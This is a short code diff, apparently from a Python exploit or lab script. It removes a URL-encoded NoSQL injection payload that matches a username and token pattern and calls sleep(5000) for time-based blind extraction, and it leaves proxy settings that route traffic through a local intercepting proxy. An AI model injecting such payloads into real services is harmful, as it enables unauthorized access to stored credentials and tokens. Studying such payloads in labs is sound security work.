@@ -10,8 +10,6 @@ logger = logging.getLogger(__name__)
 
 special = '-'
 
-injection = '%22%20%7C%7C%20this%2Eusername%2Ematch%28%22bmdyy%22%29%20%26%26%20this%2Etoken%2Ematch%28%22%5E%2E%2A%22%29%20%26%26%20sleep%285000%29%20%7C%7C%20%22%22%3D%3D%22%26'
-
 proxies = {
     "http": "http://127.0.0.1:8080",
     "https": "http://127.0.0.1:8080",
